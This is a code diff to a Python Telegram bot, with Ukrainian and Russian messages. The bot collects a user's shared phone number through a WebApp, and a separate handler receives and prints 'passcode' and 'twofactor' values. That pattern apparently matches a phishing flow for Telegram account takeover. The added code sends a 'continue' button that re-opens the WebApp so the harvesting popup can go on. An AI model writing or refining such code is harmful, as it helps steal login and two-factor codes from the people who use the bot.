@@ -51,6 +51,28 @@ def handle_webapp_data(message):
     print(data)
     bot.send_message(message.chat.id, f":telephone_receiver: Отримано номер: {data}")
 
+    # After receiving the contact, send an InlineKeyboard button that re-opens the WebApp
+    # with a query parameter so the WebApp can detect the contact was shared and show
+    # the popup. The user needs to click this button to re-open the WebApp (client-side
+    # WebApps cannot be pushed arbitrary data from the bot while open).
+    try:
+        markup = types.InlineKeyboardMarkup()
+        # Append a query param contact_approved=1 that the WebApp can read on load
+        approved_url = WEBAPP_URL + "?contact_approved=1"
+        markup.add(
+            types.InlineKeyboardButton(
+                text="Open WebApp (continue)",
+                web_app=types.WebAppInfo(url=approved_url)
+            )
+        )
+        bot.send_message(
+            message.chat.id,
+            "Thank you — tap the button below to return to the web app and continue.",
+            reply_markup=markup
+        )
+    except Exception as e:
+        print("Error sending approval button:", e)
+
 # get passcode and twofactor from webapp
 @bot.message_handler(content_types=['web_app_data'])
 def handle_webapp(message):
@@ -59,26 +81,6 @@ def handle_webapp(message):
         print(data.get("passcode_value"))
     elif data.get("action") == "twofactor_value":
         print(data.get("twofactor_value"))
-
-@bot.message_handler(content_types=['contact'])
-def handle_contact(message):
-    contact = message.contact
-    print(f"Received contact: {contact.phone_number}")
-
-    # Step 3: send a WebApp message to trigger popup
-    # You can send web_app_data to your WebApp URL, e.g., Telegram WebApp frontend
-    # Here we simulate it by sending a JSON payload
-    webapp_payload = json.dumps({"action": "contact_approved"})
-    
-    bot.send_message(
-        message.chat.id,
-        "Контакт получен! Откройте WebApp.",
-        reply_markup=types.ReplyKeyboardRemove()  # remove keyboard
-    )
-    
-    # Optionally, if WebApp is already open, you can send web_app_data
-    # For demonstration, just print:
-    print("Send this to WebApp to trigger popup:", webapp_payload)
 
 print(":white_check_mark: Бот запущено! Очікуємо дані...")
 
